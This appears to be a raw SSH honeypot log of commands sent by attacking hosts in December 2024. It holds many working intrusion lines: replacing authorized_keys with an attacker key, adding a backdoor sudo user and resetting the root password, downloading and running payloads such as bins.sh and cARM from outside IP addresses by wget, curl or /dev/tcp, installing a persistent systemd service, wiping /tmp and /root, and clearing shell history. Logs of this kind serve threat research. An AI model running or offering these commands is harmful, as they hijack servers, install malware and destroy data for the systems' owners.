start
2024-12-13 04:17:16.618902 - ('182.176.168.253', 14033) - cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
2024-12-14 15:35:04.028872 - ('46.19.143.66', 33292) - apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 vb9ycKjB) system && sudo usermod -aG sudo system
2024-12-14 15:35:04.818751 - ('46.19.143.66', 33292) - lscpu && echo -e "vb9ycKjB\nvb9ycKjB" | passwd && curl https://ipinfo.io/org --insecure -s && free -h && apt
2024-12-14 16:06:24.037893 - ('45.148.10.203', 39172) - apt
2024-12-14 16:06:25.501880 - ('45.148.10.203', 39172) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-14 16:06:34.460828 - ('45.148.10.203', 46104) - apt
2024-12-14 16:06:36.280467 - ('45.148.10.203', 46104) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-14 16:06:44.181201 - ('45.148.10.203', 48656) - apt
2024-12-14 16:06:45.706739 - ('45.148.10.203', 48656) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-14 16:06:54.283114 - ('45.148.10.203', 33130) - apt
2024-12-14 16:06:56.039864 - ('45.148.10.203', 33130) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-14 16:24:45.033999 - ('87.120.113.231', 40852) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi

2024-12-14 19:42:08.588491 - ('218.38.202.183', 40948) - /ip cloud print
2024-12-14 19:42:13.440408 - ('218.38.202.183', 40948) - ifconfig
2024-12-14 19:42:16.423174 - ('218.38.202.183', 40948) - uname -a
2024-12-14 19:42:20.208500 - ('218.38.202.183', 40948) - cat /proc/cpuinfo
2024-12-14 19:42:23.779589 - ('218.38.202.183', 40948) - ps | grep '[Mm]iner'
2024-12-14 19:42:28.127451 - ('218.38.202.183', 40948) - ps -ef | grep '[Mm]iner'
2024-12-14 19:42:32.899531 - ('218.38.202.183', 40948) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-14 19:42:36.719957 - ('218.38.202.183', 40948) - echo Hi | cat -n
2024-12-14 20:29:15.214392 - ('87.120.113.231', 48242) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi

2024-12-14 21:58:39.507716 - ('46.19.143.66', 48954) - apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 gaqjTZvd) system && sudo usermod -aG sudo system
2024-12-14 21:58:40.368417 - ('46.19.143.66', 48954) - lscpu && echo -e "gaqjTZvd\ngaqjTZvd" | passwd && curl https://ipinfo.io/org --insecure -s && free -h && apt
2024-12-15 01:42:43.775445 - ('37.44.238.68', 39414) - whoami
2024-12-15 01:42:46.027022 - ('37.44.238.68', 39440) - whoami
2024-12-15 01:42:48.871768 - ('37.44.238.68', 39476) - whoami
2024-12-15 01:42:50.880073 - ('37.44.238.68', 39492) - whoami
2024-12-15 01:42:53.472666 - ('37.44.238.68', 39430) - whoami
2024-12-15 01:42:55.805301 - ('37.44.238.68', 39454) - whoami
2024-12-15 01:42:57.544421 - ('37.44.238.68', 39466) - whoami
2024-12-15 01:42:59.567245 - ('37.44.238.68', 39480) - whoami
2024-12-15 01:43:02.035511 - ('37.44.238.68', 39504) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://37.44.238.68/bins.sh; curl -O http://37.44.238.68/bins.sh;/bin/busybox wget http://37.44.238.68/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-12-15 01:43:04.185828 - ('37.44.238.68', 39598) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://87.121.86.228/bins.sh; curl -O http://87.121.86.228/bins.sh;/bin/busybox wget http://87.121.86.228/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-12-15 01:43:08.521091 - ('37.44.238.68', 39584) - whoami
2024-12-15 01:43:08.662969 - ('37.44.238.68', 49062) - whoami
2024-12-15 01:43:10.414441 - ('37.44.238.68', 49074) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://37.44.238.68/bins.sh; curl -O http://37.44.238.68/bins.sh;/bin/busybox wget http://37.44.238.68/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-12-15 01:43:14.744296 - ('37.44.238.68', 49088) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://87.121.86.228/bins.sh; curl -O http://87.121.86.228/bins.sh;/bin/busybox wget http://87.121.86.228/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-12-15 01:43:15.161149 - ('37.44.238.68', 49098) - whoami
2024-12-15 01:43:17.173544 - ('37.44.238.68', 49102) - whoami
2024-12-15 01:43:19.282392 - ('37.44.238.68', 49106) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://37.44.238.68/bins.sh; curl -O http://37.44.238.68/bins.sh;/bin/busybox wget http://37.44.238.68/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-12-15 01:43:21.175916 - ('37.44.238.68', 49122) - whoami
2024-12-15 01:43:23.073302 - ('37.44.238.68', 49136) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://37.44.238.68/bins.sh; curl -O http://37.44.238.68/bins.sh;/bin/busybox wget http://37.44.238.68/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-12-15 01:43:24.838762 - ('37.44.238.68', 49036) - whoami
2024-12-15 01:43:27.691335 - ('37.44.238.68', 49034) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://37.44.238.68/bins.sh; curl -O http://37.44.238.68/bins.sh;/bin/busybox wget http://37.44.238.68/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-12-15 01:43:30.831659 - ('37.44.238.68', 49040) - whoami
2024-12-15 01:43:31.685179 - ('37.44.238.68', 49044) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://37.44.238.68/bins.sh; curl -O http://37.44.238.68/bins.sh;/bin/busybox wget http://37.44.238.68/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-12-15 01:43:34.339710 - ('37.44.238.68', 49052) - whoami
2024-12-15 01:43:37.201907 - ('37.44.238.68', 58572) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://37.44.238.68/bins.sh; curl -O http://37.44.238.68/bins.sh;/bin/busybox wget http://37.44.238.68/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-12-15 01:43:39.486101 - ('37.44.238.68', 58566) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://37.44.238.68/bins.sh; curl -O http://37.44.238.68/bins.sh;/bin/busybox wget http://37.44.238.68/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-12-15 01:43:40.164754 - ('37.44.238.68', 58580) - whoami
2024-12-15 01:43:42.738905 - ('37.44.238.68', 58586) - whoami
2024-12-15 01:43:44.279266 - ('37.44.238.68', 58588) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://87.121.86.228/bins.sh; curl -O http://87.121.86.228/bins.sh;/bin/busybox wget http://87.121.86.228/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-12-15 01:43:46.215689 - ('37.44.238.68', 47216) - whoami
2024-12-15 01:43:48.690356 - ('37.44.238.68', 47224) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://37.44.238.68/bins.sh; curl -O http://37.44.238.68/bins.sh;/bin/busybox wget http://37.44.238.68/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-12-15 01:43:50.402668 - ('37.44.238.68', 47228) - whoami
2024-12-15 01:43:51.156205 - ('37.44.238.68', 47240) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://87.121.86.228/bins.sh; curl -O http://87.121.86.228/bins.sh;/bin/busybox wget http://87.121.86.228/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-12-15 01:43:53.455579 - ('37.44.238.68', 47246) - whoami
2024-12-15 01:43:56.425367 - ('37.44.238.68', 47256) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://37.44.238.68/bins.sh; curl -O http://37.44.238.68/bins.sh;/bin/busybox wget http://37.44.238.68/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-12-15 01:43:58.263430 - ('37.44.238.68', 60320) - whoami
2024-12-15 01:44:00.258058 - ('37.44.238.68', 60336) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://37.44.238.68/bins.sh; curl -O http://37.44.238.68/bins.sh;/bin/busybox wget http://37.44.238.68/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-12-15 01:44:02.086729 - ('37.44.238.68', 60346) - whoami
2024-12-15 01:44:04.756662 - ('37.44.238.68', 60356) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://37.44.238.68/bins.sh; curl -O http://37.44.238.68/bins.sh;/bin/busybox wget http://37.44.238.68/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-12-15 01:44:07.427394 - ('37.44.238.68', 40112) - whoami
2024-12-15 01:44:09.599471 - ('37.44.238.68', 40114) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://37.44.238.68/bins.sh; curl -O http://37.44.238.68/bins.sh;/bin/busybox wget http://37.44.238.68/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-12-15 01:44:11.267618 - ('37.44.238.68', 40126) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://37.44.238.68/bins.sh; curl -O http://37.44.238.68/bins.sh;/bin/busybox wget http://37.44.238.68/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-12-15 01:44:14.176743 - ('37.44.238.68', 49364) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://37.44.238.68/bins.sh; curl -O http://37.44.238.68/bins.sh;/bin/busybox wget http://37.44.238.68/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-12-15 01:44:16.570596 - ('37.44.238.68', 49380) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://87.121.86.228/bins.sh; curl -O http://87.121.86.228/bins.sh;/bin/busybox wget http://87.121.86.228/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-12-15 01:44:19.267952 - ('37.44.238.68', 49390) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://37.44.238.68/bins.sh; curl -O http://37.44.238.68/bins.sh;/bin/busybox wget http://37.44.238.68/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-12-15 01:44:20.892951 - ('37.44.238.68', 59074) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://37.44.238.68/bins.sh; curl -O http://37.44.238.68/bins.sh;/bin/busybox wget http://37.44.238.68/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-12-15 01:44:23.011660 - ('37.44.238.68', 59088) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://87.121.86.228/bins.sh; curl -O http://87.121.86.228/bins.sh;/bin/busybox wget http://87.121.86.228/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-12-15 01:44:25.673277 - ('37.44.238.68', 44190) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://87.121.86.228/bins.sh; curl -O http://87.121.86.228/bins.sh;/bin/busybox wget http://87.121.86.228/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-12-15 02:22:26.469605 - ('87.120.113.231', 42604) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi

2024-12-15 02:56:11.619129 - ('45.148.10.203', 57668) - apt
2024-12-15 02:56:12.281228 - ('45.148.10.203', 57668) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-15 02:56:17.953604 - ('45.148.10.203', 32812) - apt
2024-12-15 02:56:18.580388 - ('45.148.10.203', 32812) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-15 02:56:24.407533 - ('45.148.10.203', 32816) - apt
2024-12-15 02:56:25.101086 - ('45.148.10.203', 32816) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-15 07:44:38.268140 - ('185.225.200.154', 51302) - uname -a
2024-12-15 08:09:22.869109 - ('218.92.0.132', 41748) - #!/bin/sh
PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
wget http://43.249.172.195:888/112
curl -O http://43.249.172.195:888/112
chmod +x 112
./112
wget http://43.249.172.195:888/112s
curl -O http://43.249.172.195:888/112s
chmod +x 112s
./112s
rm -rf 112.sh
rm -rf 112
rm -rf 112s
history -c

2024-12-15 08:09:25.268042 - ('218.92.0.132', 41748) - ls -la /var/run/gcc.pid
2024-12-15 09:45:54.636562 - ('46.19.143.66', 36606) - apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 XJrkktVd) system && sudo usermod -aG sudo system
2024-12-15 09:45:55.301292 - ('46.19.143.66', 36606) - lscpu && echo -e "XJrkktVd\nXJrkktVd" | passwd && curl https://ipinfo.io/org --insecure -s && free -h && apt
2024-12-15 14:19:29.261521 - ('84.215.2.141', 39532) - /ip cloud print
2024-12-15 14:19:30.628244 - ('84.215.2.141', 39532) - ifconfig
2024-12-15 14:19:31.754780 - ('84.215.2.141', 39532) - uname -a
2024-12-15 14:19:32.895597 - ('84.215.2.141', 39532) - cat /proc/cpuinfo
2024-12-15 14:19:34.015588 - ('84.215.2.141', 39532) - ps | grep '[Mm]iner'
2024-12-15 14:19:35.129744 - ('84.215.2.141', 39532) - ps -ef | grep '[Mm]iner'
2024-12-15 14:19:36.251721 - ('84.215.2.141', 39532) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-15 14:19:37.375882 - ('84.215.2.141', 39532) - echo Hi | cat -n
2024-12-15 15:08:46.417995 - ('45.148.10.203', 59274) - apt
2024-12-15 15:08:47.090893 - ('45.148.10.203', 59274) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-15 16:50:44.704001 - ('87.120.113.231', 35834) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi

